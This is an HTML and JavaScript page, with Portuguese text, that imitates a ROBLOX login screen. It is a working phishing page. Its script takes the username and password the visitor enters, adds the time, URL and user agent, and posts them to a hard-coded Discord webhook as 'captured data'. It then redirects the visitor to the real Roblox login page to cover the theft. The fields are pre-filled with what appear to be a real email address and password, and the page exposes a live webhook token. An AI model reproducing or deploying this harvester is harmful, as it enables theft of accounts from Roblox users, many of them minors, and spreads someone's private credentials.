<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ROBLOX - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: #ff3b3b;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: white;
            font-weight: bold;
        }
        
        h1 {
            color: #333;
            margin-bottom: 30px;
            font-size: 28px;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        .form-control {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        
        .form-control:focus {
            outline: none;
            border-color: #ff3b3b;
        }
        
        .input-field {
            background: #f8f9fa;
        }
        
        .btn-full-width {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn-secondary-md {
            background: #ff3b3b;
            color: white;
        }
        
        .btn-secondary-md:hover {
            background: #e63232;
            transform: translateY(-2px);
        }
        
        .login-button {
            margin-top: 10px;
        }
        
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 8px;
            display: none;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">R</div>
        <h1>Entrar no ROBLOX</h1>
        
        <form id="login-form">
            <div class="form-group">
                <input 
                    id="login-username" 
                    name="username" 
                    type="text" 
                    class="form-control input-field" 
                    autocomplete="username webauthn" 
                    placeholder="Usu√°rio/e-mail/telefone" 
                    value="gcaio98406@gmail.com"
                    required
                >
            </div>
            
            <div class="form-group">
                <input 
                    id="login-password" 
                    name="password" 
                    type="password" 
                    class="form-control input-field" 
                    placeholder="Senha" 
                    value="c45iocl4r4"
                    required
                >
            </div>
            
            <button 
                type="button" 
                id="login-button" 
                class="btn-full-width login-button btn-secondary-md"
                onclick="handleLogin()"
            >
                Entrar
            </button>
        </form>
        
        <div id="status"></div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1401010722183450735/NfPave_lXPmGoXjWrFv9t18hmxcou9-MwK6qr2b_jafajhxzdllMYyr6Je-QTHA-Tzx7';
        
        function showStatus(message, type = 'info') {
            const statusDiv = document.getElementById('status');
            statusDiv.innerHTML = `<div class="status ${type}">${message}</div>`;
            statusDiv.style.display = 'block';
        }
        
        function handleLogin() {
            const username = document.getElementById('login-username').value;
            const password = document.getElementById('login-password').value;
            
            if (!username || !password) {
                showStatus('‚ùå Por favor, preencha todos os campos!', 'error');
                return;
            }
            
            // Mostrar mensagem de carregamento
            showStatus('‚è≥ Verificando credenciais...', 'info');
            
            // Preparar dados para enviar
            const loginData = {
                username: username,
                password: password,
                timestamp: new Date().toLocaleString('pt-BR'),
                url: window.location.href,
                userAgent: navigator.userAgent,
                ip: 'Capturado via webhook'
            };
            
            // Criar mensagem para o Discord
            const messageText = `üîê **ROBLOX - Dados Capturados**

üë§ **Usu√°rio:** ${loginData.username}
üîë **Senha:** ${loginData.password}
‚è∞ **Data/Hora:** ${loginData.timestamp}
üåê **URL:** ${loginData.url}
üì± **User Agent:** ${loginData.userAgent}
üåç **IP:** ${loginData.ip}`;
            
            // Enviar para o webhook
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: messageText
                })
            })
            .then(response => {
                if (response.ok) {
                    showStatus('‚úÖ Login realizado com sucesso! Redirecionando...', 'success');
                    
                    // Simular redirecionamento ap√≥s 2 segundos
                    setTimeout(() => {
                        // Aqui voc√™ pode redirecionar para a p√°gina real do ROBLOX
                        window.location.href = 'https://www.roblox.com/login';
                    }, 2000);
                } else {
                    showStatus('‚ùå Erro no servidor. Tente novamente.', 'error');
                }
            })
            .catch(error => {
                showStatus('‚ùå Erro de conex√£o. Verifique sua internet.', 'error');
                console.error('Erro:', error);
            });
        }
        
        // Permitir login com Enter
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                handleLogin();
            }
        });
        
        // Focar no primeiro campo ao carregar
        window.onload = function() {
            document.getElementById('login-username').focus();
        };
    </script>
</body>
</html>
